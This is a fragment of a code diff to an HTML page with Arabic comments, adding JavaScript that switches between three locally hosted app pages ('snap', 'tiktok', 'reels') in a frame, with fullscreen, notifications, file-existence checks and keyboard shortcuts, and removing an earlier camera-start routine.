+                frame.src = `${appInfo.file}`;
+                frame.onload = function() {
+                    frame.style.opacity = '1';
+                    document.getElementById('loadingOverlay').style.display = 'none';
+                    showNotification(`🔄 تم تحديث ${appInfo.name}`);
+                };
+            }, 300);
         }
 
+        // وضع ملء الشاشة
+        function toggleFullscreen() {
+            const container = document.getElementById('appContainer');
+            
+            if (!document.fullscreenElement) {
+                container.requestFullscreen();
+                showNotification('🔍 وضع ملء الشاشة');
+            } else {
+                document.exitFullscreen();
+            }
+        }
+
+        // عرض الإشعارات
+        function showNotification(message, type = 'success') {
+            const notification = document.createElement('div');
+            notification.className = 'notification';
+            
+            let icon = '✅';
+            if (type === 'error') icon = '❌';
+            else if (type === 'warning') icon = '⚠️';
+            
+            notification.innerHTML = `<i class="fas fa-bell"></i> ${icon} ${message}`;
+            document.body.appendChild(notification);
+            
+            setTimeout(() => {
+                notification.remove();
+            }, 2000);
+        }
+
+        // التحقق من وجود الملفات
+        function checkFiles() {
+            const files = ['snam.html', 'tikm.html', 'reels.html'];
+            
+            files.forEach(file => {
+                fetch(file)
+                    .then(response => {
+                        if (!response.ok) {
+                            showNotification(`⚠️ الملف ${file} غير موجود`, 'warning');
+                        }
+                    })
+                    .catch(() => {
+                        showNotification(`⚠️ الملف ${file} غير موجود`, 'warning');
+                    });
+            });
+        }
+
+        // اختصار لوحة المفاتيح
+        document.addEventListener('keydown', (e) => {
+            if (e.altKey) {
+                switch(e.key) {
+                    case '1':
+                        switchApp('snap');
+                        break;
+                    case '2':
+                        switchApp('tiktok');
+                        break;
+                    case '3':
+                        switchApp('reels');
+                        break;
+                    case 'r':
+                        refreshApp();
+                        break;
+                    case 'f':
+                        toggleFullscreen();
+                        break;
+                }
+            }
+            
+            // ESC للخروج من ملء الشاشة
+            if (e.key === 'Escape' && document.fullscreenElement) {
+                document.exitFullscreen();
+            }
+        });
+
+        // تهيئة الصفحة
         window.onload = function() {
-            startCamera();
-            countdownDisplay.style.display = 'none';
-            liveIndicator.style.display = 'none';
-            updateCameraButtons();
+            checkFiles();
+            showNotification('✨ مرحباً بك - استخدم الأزرار العلوية للتبديل بين التطبيقات');
+            
+            // تحميل التطبيق الأول
+            setTimeout(() => {
+                document.getElementById('loadingOverlay').style.display = 'none';
+            }, 1000);
         };
     </script>
 </body>
 </html>
+
+
 
